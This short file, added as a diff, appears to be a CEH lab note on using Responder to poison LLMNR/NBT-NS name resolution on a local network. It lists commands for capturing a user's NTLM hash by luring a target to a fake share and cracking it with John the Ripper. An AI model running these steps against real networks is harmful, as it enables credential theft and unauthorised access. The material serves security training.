@@ -1,0 +1,25 @@
+Responder * Linux 
+
+# UseCase: 
+[Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.]
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ sudo responder -I eth0 
+[Responder starts listening to the network interface for events]
+
+$ Type run [in the serach field of the Target Window Machine]
+
+$ Type \\CEH-Tools and click on OK [in the run dialog box window]
+
+$ Copy the Hash of Jason [User]
+
+$ Save the Hash value , type 
+
+$ sudo pluma hash.txt [Save the Hash value , save the only Hash Value of the User] 
+
+$ type john hash.txt [command to crack the password of Jason] 
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+
